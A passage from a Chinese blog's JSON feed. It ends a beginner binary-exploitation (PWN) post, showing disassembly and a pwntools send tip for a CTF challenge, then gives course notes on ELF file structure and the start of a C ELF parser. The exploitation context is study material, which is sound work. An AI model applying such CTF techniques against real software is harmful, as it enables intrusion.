class=\"line\">.text:0000000000401343                 mov     rsi, rcx        ; buf</span><br><span class=\"line\">.text:0000000000401346                 mov     edi, eax        ; fd</span><br><span class=\"line\">.text:0000000000401348                 call    _read</span><br><span class=\"line\">.text:000000000040134D                 test    rax, rax</span><br><span class=\"line\">.text:0000000000401350                 jns     short loc_401368</span><br><span class=\"line\">.text:0000000000401352                 lea     rdi, aReadError ; &quot;read error&quot;</span><br><span class=\"line\">.text:0000000000401359                 call    _puts</span><br><span class=\"line\">.text:000000000040135E                 mov     edi, 1          ; status</span><br><span class=\"line\">.text:0000000000401363                 call    __exit</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t应该调用plt这个,这个调用完之后会ret返回</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt.sec:0000000000401100 _read           proc near               ; CODE XREF: some_gifts+59↓p</span><br><span class=\"line\">.plt.sec:0000000000401100                                         ; vuln+23↓p</span><br><span class=\"line\">.plt.sec:0000000000401100                 endbr64</span><br><span class=\"line\">.plt.sec:0000000000401104                 bnd jmp cs:off_404038</span><br><span class=\"line\">.plt.sec:0000000000401104 _read           endp</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"send、sendline\"><a href=\"#send、sendline\" class=\"headerlink\" title=\"send、sendline\"></a>send、sendline</h2><p>​\t\tsh.send(“flag”) #  不能用sendline 会有\\n  第一次read读取flag文件名的时候,不能用sendline,否则会有个回车,就不是正确的文件名了</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/",
            "url": "https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/",
            "title": "ucas-软件安全漏洞分析与发现-elf分析与解析实现",
            "date_published": "2023-03-14T01:26:04.000Z",
            "content_html": "<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230314100936800.png\" alt=\"image-20230314100936800\"></p>\n<h1 id=\"一、基础\"><a href=\"#一、基础\" class=\"headerlink\" title=\"一、基础\"></a>一、基础</h1><h2 id=\"ELF文件-整体架构\"><a href=\"#ELF文件-整体架构\" class=\"headerlink\" title=\"ELF文件 整体架构\"></a>ELF文件 整体架构</h2><p>​\telf文件主要分了几部分:头部、程序头、节表头以及各种节.</p>\n<p>​\telf头部中存储了程序头和节表头的位置,节头中又存储了各个节的位置,以此进行索引.</p>\n<p>​\t所以可以回答第2个问题的一部分, 这些节(我认为题目应该说的是节的意思, 段和节经常混用) 在ELF中的位置是可以任意调换的,因为在头部中指定了它们的位置,只要索引信息没问题就可以.</p>\n<p><a href=\"https://img-blog.csdnimg.cn/b285b3b11743431d8141594ad4b3f8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16\"><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16.png\" alt=\"img\"></a></p>\n<h2 id=\"链接视图与执行时视图\"><a href=\"#链接视图与执行时视图\" class=\"headerlink\" title=\"链接视图与执行时视图\"></a>链接视图与执行时视图</h2><p>​\t\telf静态文件是链接视图,当加载到内存后,会有些许变化.</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322090941304.png\" alt=\"image-20230322090941304\"></p>\n<p>​\t\t在链接视图中,节表是必须的,需要根据它来定位各个节,以及保存节的属性,而程序头表则是可选的,程序头表的内容是加载进内存后的属性(<font color=\"red\">是否可选要看该文件的类型??</font>).</p>\n<p>​\t\t在执行视图中,程序头表是必须的,节表就是可选的了.</p>\n<p>​\t\t在静态文件中,有各种不一样的程序的节(section),比如.text节 .bss节,在加载进内存后,<code>加载器</code>会将相同的节属性（比如只读）合并一个段(segment)</p>\n<h2 id=\"ELF文件头-ehdr\"><a href=\"#ELF文件头-ehdr\" class=\"headerlink\" title=\"ELF文件头 ehdr\"></a>ELF文件头 ehdr</h2><p>​\t\t详细内容:<a href=\"https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html\">https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html</a></p>\n<p>​\t\t结构体定义如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define EI_NIDENT 16</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct &#123;</span><br><span class=\"line\">        unsigned char   e_ident[EI_NIDENT];</span><br><span class=\"line\">        Elf32_Half      e_type;</span><br><span class=\"line\">        Elf32_Half      e_machine;</span><br><span class=\"line\">        Elf32_Word      e_version;</span><br><span class=\"line\">        Elf32_Addr      e_entry;</span><br><span class=\"line\">        Elf32_Off       e_phoff;</span><br><span class=\"line\">        Elf32_Off       e_shoff;</span><br><span class=\"line\">        Elf32_Word      e_flags;</span><br><span class=\"line\">        Elf32_Half      e_ehsize;</span><br><span class=\"line\">        Elf32_Half      e_phentsize;</span><br><span class=\"line\">        Elf32_Half      e_phnum;</span><br><span class=\"line\">        Elf32_Half      e_shentsize;</span><br><span class=\"line\">        Elf32_Half      e_shnum;</span><br><span class=\"line\">        Elf32_Half      e_shstrndx;</span><br><span class=\"line\">&#125; Elf32_Ehdr;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned char\te_ident[EI_NIDENT];\t/* Magic number and other info */</span><br><span class=\"line\">  Elf64_Half\te_type;\t\t\t/* Object file type */ elf文件类型</span><br><span class=\"line\">  Elf64_Half\te_machine;\t\t/* Architecture */    CPU架构</span><br><span class=\"line\">  Elf64_Word\te_version;\t\t/* Object file version */  指定ELF版本,一般都为1</span><br><span class=\"line\">  Elf64_Addr\te_entry;\t\t/* Entry point virtual address */  代码运行的入口</span><br><span class=\"line\">  Elf64_Off\te_phoff;\t\t/* Program header table file offset */  程序头表在文件中的偏移</span><br><span class=\"line\">  Elf64_Off\te_shoff;\t\t/* Section header table file offset */\t节头表在文件中的偏移</span><br><span class=\"line\">  Elf64_Word\te_flags;\t\t/* Processor-specific flags */\t在e_machine指定的处理器下的一些特性</span><br><span class=\"line\">  Elf64_Half\te_ehsize;\t\t/* ELF header size in bytes */</span><br><span class=\"line\">  Elf64_Half\te_phentsize;\t\t/* Program header table entry size */\t程序头表每个条目的大小</span><br><span class=\"line\">  Elf64_Half\te_phnum;\t\t/* Program header table entry count */\t\t程序头表中条目的树木</span><br><span class=\"line\">  Elf64_Half\te_shentsize;\t\t/* Section header table entry size */\t节头表每个条目的大小</span><br><span class=\"line\">  Elf64_Half\te_shnum;\t\t/* Section header table entry count */\t\t节头表中条目的数量</span><br><span class=\"line\">  Elf64_Half\te_shstrndx;\t\t/* Section header string table index */  每个节都有一个名称,这些名称存储在.shstrtab节中,e_shstrndx指定这个特殊的节所在节头表的下表</span><br><span class=\"line\">&#125; Elf64_Ehdr;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以用010editor加载插件后清晰的看到结构(需要在templates里面安装和加载一下elf模版)</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094455562.png\" alt=\"image-20230322094455562\"></p>\n<h3 id=\"e-ident\"><a href=\"#e-ident\" class=\"headerlink\" title=\"e_ident\"></a>e_ident</h3><p>​\t\t一个16字节大小的数组</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094613842.png\" alt=\"image-20230322094613842\"></p>\n<p>​\t这个下标范围标错了吧….</p>\n<h2 id=\"ELF节表头-shdr\"><a href=\"#ELF节表头-shdr\" class=\"headerlink\" title=\"ELF节表头 shdr\"></a>ELF节表头 shdr</h2><p>​\t\te_shoff是 0x19a8(小端)</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100247070.png\" alt=\"image-20230322100247070\"></p>\n<p>​\t\t可以看到0x19a8开始,存储的是各个节的内容</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100349315.png\" alt=\"image-20230322100349315\"></p>\n<p>​\t\t结构如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* Section header.  */</span><br><span class=\"line\"> </span><br><span class=\"line\">typedef struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Elf32_Word  sh_name;        /* Section name (string tbl index) */</span><br><span class=\"line\">    Elf32_Word  sh_type;        /* Section type */</span><br><span class=\"line\">    Elf32_Word  sh_flags;       /* Section flags */</span><br><span class=\"line\">    Elf32_Addr  sh_addr;        /* Section virtual addr at execution */</span><br><span class=\"line\">    Elf32_Off   sh_offset;      /* Section file offset */</span><br><span class=\"line\">    Elf32_Word  sh_size;        /* Section size in bytes */</span><br><span class=\"line\">    Elf32_Word  sh_link;        /* Link to another section */</span><br><span class=\"line\">    Elf32_Word  sh_info;        /* Additional section information */</span><br><span class=\"line\">    Elf32_Word  sh_addralign;       /* Section alignment */</span><br><span class=\"line\">    Elf32_Word  sh_entsize;     /* Entry size if section holds table */</span><br><span class=\"line\">&#125; Elf32_Shdr;</span><br><span class=\"line\"> </span><br><span class=\"line\">typedef struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Elf64_Word  sh_name;        /* Section name (string tbl index) */ 名称,值是在string表的索引</span><br><span class=\"line\">    Elf64_Word  sh_type;        /* Section type */</span><br><span class=\"line\">    Elf64_Xword sh_flags;       /* Section flags */  标记属性 读写执行</span><br><span class=\"line\">    Elf64_Addr  sh_addr;        /* Section virtual addr at execution */   虚拟地址</span><br><span class=\"line\">    Elf64_Off   sh_offset;      /* Section file offset */\t\t\t在文件中的偏移</span><br><span class=\"line\">    Elf64_Xword sh_size;        /* Section size in bytes */\t\t\t大小</span><br><span class=\"line\">    Elf64_Word  sh_link;        /* Link to another section */</span><br><span class=\"line\">    Elf64_Word  sh_info;        /* Additional section information */</span><br><span class=\"line\">    Elf64_Xword sh_addralign;       /* Section alignment */</span><br><span class=\"line\">    Elf64_Xword sh_entsize;     /* Entry size if section holds table */</span><br><span class=\"line\">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"sh-name\"><a href=\"#sh-name\" class=\"headerlink\" title=\"sh_name\"></a>sh_name</h3><p>​\t\t这里存储的是节名的下标,节名实际存在于.shstrtab中,这里存的是在shstrtab中的下标.</p>\n<h2 id=\"节-section\"><a href=\"#节-section\" class=\"headerlink\" title=\"节 section\"></a>节 section</h2><h3 id=\"text节\"><a href=\"#text节\" class=\"headerlink\" title=\".text节\"></a>.text节</h3><p>​\t\t保存了程序代码指令的代码节. 一段可执行程序如果存在Phdr, .text字节就会存在于text段中(<font color=\"red\">如果不存在呢??</font>)</p>\n<h3 id=\"rodata节\"><a href=\"#rodata节\" class=\"headerlink\" title=\".rodata节\"></a>.rodata节</h3><p>​\t\t保存只读数据,如一行c语言代码中的字符串  printf(“hello world\\n”); 因为是只读,所以也放到了text段</p>\n<h3 id=\"data节\"><a href=\"#data节\" class=\"headerlink\" title=\".data节\"></a>.data节</h3><p>​\t\t保存了初始的全局变量等数据.存在于data段</p>\n<h3 id=\"bss节\"><a href=\"#bss节\" class=\"headerlink\" title=\".bss节\"></a>.bss节</h3><p>​\t\t保存了未进行初始化的全局数据,存在于data段.</p>\n<h3 id=\"plt\"><a href=\"#plt\" class=\"headerlink\" title=\".plt\"></a>.plt</h3><p>​\t\t包含了动态链接器调用从共享库导入的函数所必需的相关代码. 存在于text段中,同样保存了代码.</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230303132136453.png\" alt=\"image-20230303132136453\"></p>\n<h3 id=\"got\"><a href=\"#got\" class=\"headerlink\" title=\".got\"></a>.got</h3><p>​\t\t保存了全局偏移表.这个存的是变量</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230228164021947.png\" alt=\"image-20230228164021947\"></p>\n<h3 id=\"got-plt\"><a href=\"#got-plt\" class=\"headerlink\" title=\".got.plt\"></a>.got.plt</h3><p>​\t\t这个存的是函数引用</p>\n<h3 id=\"dynsym\"><a href=\"#dynsym\" class=\"headerlink\" title=\".dynsym\"></a>.dynsym</h3><p>​\t\t保存了从共享库导入的动态符号信息,该节保存在text段中</p>\n<h3 id=\"dynstr\"><a href=\"#dynstr\" class=\"headerlink\" title=\".dynstr\"></a>.dynstr</h3><p>​\t\t保存了动态符号字符串表,表中存放了一系列字符串,这些字符串表示符号的名称,以空字符00作为终止符</p>\n<h2 id=\"ELF程序头-phdr-segment段\"><a href=\"#ELF程序头-phdr-segment段\" class=\"headerlink\" title=\"ELF程序头 phdr (segment段)\"></a>ELF程序头 phdr (segment段)</h2><p>​\t\t程序头中描述了可执行文件的段信息,即程序如何加载到内存以及内存中的布局.</p>\n<p>​\t\t程序头可以通过elf文件头的e_phoff（程序头表偏移量）字段来得到位置</p>\n<p>​\t\t它主要有5种类型</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Program segment header.  */</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    Elf32_Word  p_type;         <span class=\"comment\">/* Segment type */</span></span><br><span class=\"line\">    Elf32_Off   p_offset;       <span class=\"comment\">/* Segment file offset */</span></span><br><span class=\"line\">    Elf32_Addr  p_vaddr;        <span class=\"comment\">/* Segment virtual address */</span></span><br><span class=\"line\">    Elf32_Addr  p_paddr;        <span class=\"comment\">/* Segment physical address */</span></span><br><span class=\"line\">    Elf32_Word  p_filesz;       <span class=\"comment\">/* Segment size in file */</span></span><br><span class=\"line\">    Elf32_Word  p_memsz;        <span class=\"comment\">/* Segment size in memory */</span></span><br><span class=\"line\">    Elf32_Word  p_flags;        <span class=\"comment\">/* Segment flags , I.E execute|read|write */</span></span><br><span class=\"line\">    Elf32_Word  p_align;        <span class=\"comment\">/* Segment alignment */</span></span><br><span class=\"line\">&#125; Elf32_Phdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\tElf64_Word\tp_type;    <span class=\"comment\">//类型</span></span><br><span class=\"line\">\tElf64_Word\tp_flags;   <span class=\"comment\">// 读写执行权限</span></span><br><span class=\"line\">\tElf64_Off\tp_offset;   <span class=\"comment\">//文件中的偏移</span></span><br><span class=\"line\">\tElf64_Addr\tp_vaddr;  <span class=\"comment\">//虚拟地址</span></span><br><span class=\"line\">\tElf64_Addr\tp_paddr;  <span class=\"comment\">//物理地址</span></span><br><span class=\"line\">\tElf64_Xword\tp_filesz; <span class=\"comment\">//在文件中的大小\t</span></span><br><span class=\"line\">\tElf64_Xword\tp_memsz;\t<span class=\"comment\">//在内存中的大小</span></span><br><span class=\"line\">\tElf64_Xword\tp_align;  <span class=\"comment\">//</span></span><br><span class=\"line\">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PT-LOAD\"><a href=\"#PT-LOAD\" class=\"headerlink\" title=\"PT_LOAD\"></a>PT_LOAD</h3><p>​\t\t一个可执行文件至少有一个该类型的段.PT_LOAD表述的是可装载的段,这种类型的段会被装载或者映射到内存中,</p>\n<h2 id=\"编译器如何对节段进行组织安排\"><a href=\"#编译器如何对节段进行组织安排\" class=\"headerlink\" title=\"编译器如何对节段进行组织安排\"></a>编译器如何对节段进行组织安排</h2><p>​\t\t这里所说的是编译环节,从源代码到二进制文件.</p>\n<h2 id=\"ELF装载过程\"><a href=\"#ELF装载过程\" class=\"headerlink\" title=\"ELF装载过程\"></a>ELF装载过程</h2><p>​\t\t这里是指把二进制文件加载进内存的过程</p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><h2 id=\"一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义\"><a href=\"#一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义\" class=\"headerlink\" title=\"一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义\"></a>一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221121391.png\" alt=\"image-20230323221121391\"></p>\n<h2 id=\"编译器如何对这些段进行编排和组织-顺序是否可以任意调换\"><a href=\"#编译器如何对这些段进行编排和组织-顺序是否可以任意调换\" class=\"headerlink\" title=\"编译器如何对这些段进行编排和组织,顺序是否可以任意调换\"></a>编译器如何对这些段进行编排和组织,顺序是否可以任意调换</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221148505.png\" alt=\"image-20230323221148505\"></p>\n<h2 id=\"是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）\"><a href=\"#是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）\" class=\"headerlink\" title=\"是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）\"></a>是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221203956.png\" alt=\"image-20230323221203956\"></p>\n<p>文件头52????</p>\n<p>magic number16字节 还剩36字节 </p>\n<p>8*2 + 4 * 2 + 4 + 4 * 2 &#x3D; 36</p>\n<p>0x3e &#x3D; 62 </p>\n<h1 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h1><p>删除一些段,程序是否还能正常运行? 程序必须的段 节是哪些??</p>\n<p>怎么增删改text段等 欺骗编译器等</p>\n<h1 id=\"代码编写\"><a href=\"#代码编写\" class=\"headerlink\" title=\"代码编写\"></a>代码编写</h1><p>自己也要编译成32位才行</p>\n<p>gcc -m32 1.c &amp;&amp; .&#x2F;a.out test</p>\n<p>可以参考readelf</p>\n<p>先把32位的都给写好,然后再加上64位的</p>\n<p>1.改进,32位 64位,根据文件头判断,然后再进行解析</p>\n<p>解析段和节,名称 起始和结束位置, 大小,权限</p>\n<p>fatal error: elf32.h: No such file or directory<br> #include &lt;elf32.h&gt;</p>\n<p>fatal error: bits&#x2F;libc-header-start.h: No such file or directory</p>\n<p><a href=\"https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili\">https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili</a></p>\n<p>e_ident 怎么输出多位, c</p>\n<p>怎么定义空格字符呢?</p>\n<p>gcc -m32 1.c  需要编译成32位的,目前也只能解析32位程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;elf.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span 